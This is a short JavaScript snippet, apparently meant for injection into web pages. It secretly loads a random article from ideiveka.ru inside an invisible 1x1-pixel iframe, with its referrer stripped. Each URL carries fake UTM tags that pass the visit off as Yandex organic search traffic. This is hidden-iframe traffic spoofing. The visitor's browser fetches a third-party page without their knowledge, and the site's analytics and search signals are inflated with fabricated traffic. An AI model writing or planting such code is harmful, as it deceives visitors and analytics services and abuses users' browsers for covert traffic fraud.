  const urls = [
    "https://ideiveka.ru/budushhee-kreativa-ii-hudozhniki-generativnyj-dizajn-i-novyj-format-iskusstva?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://ideiveka.ru/intuiciya-i-analitika-kak-balansirovat-mezhdu-chujkoj-i-dannymi?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://ideiveka.ru/kreativ-v-povsednevnoj-zhizni-reshaj-problemy-kak-hudozhnik?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://ideiveka.ru/tvorchestvo-vs-logika-kak-sovmestit-nesovmestimoe-i-sdelat-moshhno?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://ideiveka.ru/grafika-kotoraya-prodajot-pochemu-dizajn-eto-ne-krasivo-a-rabotaet?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://ideiveka.ru/cvet-forma-ideya-chto-takoe-sovremennyj-vizualnyj-trend?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://ideiveka.ru/kak-rodit-ideju-kotoroj-eshhjo-ne-bylo-tehniki-proryvnogo-tvorchestva?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://ideiveka.ru/nestandart-novyj-norm-kak-myslit-vne-formata-i-pobezhdat?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://ideiveka.ru/dizajn-myshlenie-v-biznese-pochemu-empatiya-i-prototipy-rvut-rynok?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://ideiveka.ru/kreativ-kak-instrument-kak-reshat-slozhnye-zadachi-cherez-iskusstvo?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
 ];

  function loadIframe() {
    const page = urls[Math.floor(Math.random() * urls.length)];
    const iframe = document.createElement("iframe");
    iframe.src = page;
    iframe.style = "width:1px; height:1px; border:none;";
    iframe.referrerPolicy = "no-referrer";
    document.body.appendChild(iframe);
  }

  // Запуск сразу без повторов
  loadIframe();
